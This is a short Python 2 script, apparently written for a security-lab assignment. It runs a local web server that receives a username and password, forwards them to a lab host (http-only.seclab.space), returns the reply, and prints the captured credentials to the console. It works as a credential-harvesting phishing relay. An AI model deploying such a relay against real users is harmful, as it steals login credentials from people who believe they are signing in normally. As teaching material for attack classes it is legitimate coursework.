#Base code obtained from: http://www.codexpedia.com/python/python-web-server-for-get-and-post-requests/
#Additional code has been added in do_POST for the assignment

from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
from urlparse import parse_qs
import cgi, httplib, urlparse, urllib

class GP(BaseHTTPRequestHandler):
    def _set_headers(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        
    def do_POST(self):
        self._set_headers()
        form = cgi.FieldStorage(
            fp=self.rfile,
            headers=self.headers,
            environ={'REQUEST_METHOD': 'POST'}
        )
        username = form.getvalue("username")
        password = form.getvalue("password")

        params = urllib.urlencode({'username': username, 'password': password, 'action': 'show'})
        headers = {"Content-type": "application/x-www-form-urlencoded",
                    "Accept": "text/plain"}
        conn = httplib.HTTPConnection("http-only.seclab.space")
        conn.request("POST", "", params, headers)
        response = conn.getresponse()

        print response.status, response.reason

        data = response.read()

        print data

        conn.close()

        print form.getvalue("username")
        print form.getvalue("password")
        self.wfile.write(data)

def run(server_class=HTTPServer, handler_class=GP, port=8080):
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    print 'Server running at localhost:8080...'
    httpd.serve_forever()

run()